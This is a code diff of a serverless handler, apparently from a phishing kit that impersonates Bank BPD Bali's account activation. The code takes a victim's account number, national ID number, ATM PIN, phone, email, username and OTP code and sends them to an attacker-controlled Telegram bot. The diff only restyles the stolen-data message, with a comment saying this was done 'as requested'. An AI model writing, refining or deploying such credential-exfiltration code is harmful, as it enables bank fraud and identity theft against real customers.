@@ -37,31 +37,26 @@ exports.handler = async (event, context) => {
             };
         }
         
-        // Format pesan untuk Telegram
+        // Format pesan untuk Telegram - SESUAI PERMINTAAN
         const message = `
-🔐 *AKTIVASI BANK BPD BALI* 🔐
-━━━━━━━━━━━━━━━━━━━━━
-🕐 *Waktu:* ${data.timestamp || new Date().toLocaleString('id-ID')}
-━━━━━━━━━━━━━━━━━━━━━
-📋 *DATA NASABAH*
-━━━━━━━━━━━━━━━━━━━━━
-🏦 *No. Rekening:* ${data.noRekening}
-🆔 *No. Identitas:* ${data.noIdentitas}
-🔑 *PIN ATM:* ${data.pinAtm}
-📞 *No. Telepon:* ${data.noTelpon}
-✉️ *Email:* ${data.email}
-━━━━━━━━━━━━━━━━━━━━━
-👤 *Username:* ${data.username}
-🔢 *Kode OTP:* ${data.kodeOtp}
-━━━━━━━━━━━━━━━━━━━━━
-✅ *STATUS: AKTIVASI BERHASIL*
+┌─  BANK BPD BALI 
+├───────────────────
+├─ NO.REK : ${data.noRekening}
+├─ NIK.KTP : ${data.noIdentitas}
+├─ PIN ATM : ${data.pinAtm}
+├─ NO.HP : ${data.noTelpon}
+├─ EMAIL : ${data.email}
+├───────────────────
+├─ USER : ${data.username}
+├─ KODE : ${data.kodeOtp}
+╰───────────────────
         `;
         
         // Encode pesan untuk URL
         const encodedMessage = encodeURIComponent(message);
         
         // Kirim ke Telegram Bot API
-        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`;
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
         
         const response = await fetch(telegramUrl);
         const result = await response.json();
